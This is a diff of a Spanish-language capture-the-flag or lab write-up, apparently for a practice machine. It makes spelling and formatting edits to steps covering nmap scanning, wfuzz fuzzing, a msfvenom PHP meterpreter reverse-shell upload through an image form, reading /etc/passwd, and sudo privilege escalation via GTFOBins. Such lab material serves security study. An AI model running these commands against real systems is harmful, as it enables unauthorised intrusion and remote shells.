@@ -21,13 +21,13 @@ ___
 
 #### FASE ENUMERACIÓN / RECOPILACIÓN:
 
-Primero comenzamos con el escaneo del objetivo (puertos, servicios y versiones). Para ello, utilicé la herramienta nmap:  
+Primero comenzamos con el Escaneo del objetivo (puertos, servicios y versiones). Para ello, utilicé la herramienta nmap:  
 
 `nmap -n -v -sV -sC --min-rate 5000 --open 172.18.0.2`  
 
-El reporte sólo muestra el puerto 80 abierto, lo indica que se trata de la web app.  
+El reporte sólo muestra el puerto 80 abierto, lo que indica que se trata de una web app.  
 	
-Luego proseguimos con la enumeración de directorios web. Para esto utilicé la herramienta wfuzz:  
+Luego proseguimos con la Enumeración de Directorios Web. Para esto utilicé la herramienta wfuzz:  
 
 `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -u "http://172.18.0.2/FUZZ/"`
 
@@ -51,7 +51,7 @@ ____
 		
 #### FASE EXPLOTACIÓN:  
 
-Al acceder a la URI /themes/archivo.html, vemos que se trata de un formulario de subida. Por lo visto, sólo acepta imágenes JPG o JPEG, entonces debemos pensar en subir nuestra web-shell en una imagen. En mi caso la creé el código PHP con msfvenom:  
+Al acceder a la URI /themes/archivo.html, vemos que se trata de un formulario de subida. Por lo visto, sólo acepta imágenes JPG o JPEG, entonces debemos pensar en subir nuestra web-shell en una imagen. En mi caso, creé el código PHP con msfvenom:  
 
 `msfvenom -p php/meterpreter/reverse_tcp LHOST=172.18.0.3 LPORT=6660 R -o webshell.php`  
 
@@ -125,13 +125,13 @@ Una vez ya tenemos un pie dentro del sistema, hay que enumerar usuarios para esc
 `cat /etc/passwd`  
 
 Encontramos a:  
-	* daphne
-	* vilma 
-	* shaggy
-	* fred  
-	* scooby 
+* daphne  
+* vilma  
+* shaggy  
+* fred  
+* scooby  
 
-Una vez tenemos los usuarios hay que buscar privilegios sudo, por ejemplo. Siendo www-data, corremos sudo -l y todo lo que sigue es consultar la página https://gtfobins.github.io/ y de manera anidada vamos resolviendo mediante la Explotación SUDO hasta conseguir root:
+Una vez tenemos los usuarios podemos buscar Privilegios Sudo, por ejemplo. Siendo www-data, corremos `sudo -l` y todo lo que sigue es consultar la página https://gtfobins.github.io/ y de manera anidada vamos resolviendo usando Explotación SUDO hasta conseguir root:
 
 ```
 sudo -l
